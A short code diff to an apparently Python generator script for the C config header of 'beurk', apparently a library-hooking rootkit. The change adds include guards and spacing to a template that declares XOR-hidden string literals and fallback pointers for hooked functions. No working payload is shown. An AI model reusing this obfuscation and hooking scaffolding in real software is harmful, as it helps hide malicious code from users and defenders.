@@ -187,22 +187,27 @@ CONFIG_H = """/*
 
 #pragma once
 
-#include <stdlib.h>
+#ifndef _CONFIG_H_
+# define _CONFIG_H_
 
-/* common macros from beurk config file*/
+# include <stdlib.h>
+
+/* common macros from beurk config file */
 %(common_macros)s
 
 /* store hidden (XORed) literals */
-#define NUM_LITERALS (%(num_literals)d)
-#define MAX_LITERAL_SIZE (%(max_literal_size)d)
+# define NUM_LITERALS (%(num_literals)d)
+# define MAX_LITERAL_SIZE (%(max_literal_size)d)
 extern char __hidden_literals[NUM_LITERALS][MAX_LITERAL_SIZE];
 
 /* store real function pointers (hooks fallbacks) */
-#define NUM_HOOKS (%(num_hooks)d)
+# define NUM_HOOKS (%(num_hooks)d)
 ssize_t (*__non_hooked_symbols[NUM_HOOKS])();
 
 /* hidden literals and function pointers */
 %(literals_macros)s
+
+#endif /* _CONFIG_H_ */
 """
 
 CONFIG_C = """/*
